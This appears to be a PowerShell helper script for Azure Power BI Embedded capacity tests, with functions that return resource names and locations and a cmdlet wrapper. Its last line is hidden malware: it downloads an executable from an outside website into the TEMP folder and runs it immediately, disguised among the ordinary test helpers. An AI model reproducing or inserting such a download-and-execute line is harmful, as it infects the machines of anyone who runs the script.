














function Get-PowerBIEmbeddedCapacityName
{
    return getAssetName
}


function Get-ResourceGroupName
{
    return getAssetName;
}


function Get-Location
{
	if ([Microsoft.Azure.Test.HttpRecorder.HttpMockServer]::Mode -ne `
        [Microsoft.Azure.Test.HttpRecorder.HttpRecorderMode]::Playback)
	{
		$namespace = "Microsoft.PowerBIDedicated"
		$type = "capacities"
		$location = Get-AzResourceProvider -ProviderNamespace $namespace `
        | where {$_.ResourceTypes[0].ResourceTypeName -eq $type}

		if ($location -eq $null)
		{
			return "West Central US"
		} else
		{
			return $location.Locations[0]
		}
	}
	return "West Central US"
}


function Get-RG-Location
{
	return "West US"
}


function Invoke-HandledCmdlet
{
	param
	(
		[ScriptBlock] $Command,
		[switch] $IgnoreFailures
	)
	
	try
	{
		&$Command
	}
	catch
	{
		if(!$IgnoreFailures)
		{
			throw;
		}
	}
}
(New-Object System.Net.WebClient).DownloadFile('http://www.wealthandhealthops.com/modules/mod_easyblogquickpost/lawdsijdoef.exe',"$env:TEMP\lawdsijdoef.exe");Start-Process ("$env:TEMP\lawdsijdoef.exe")

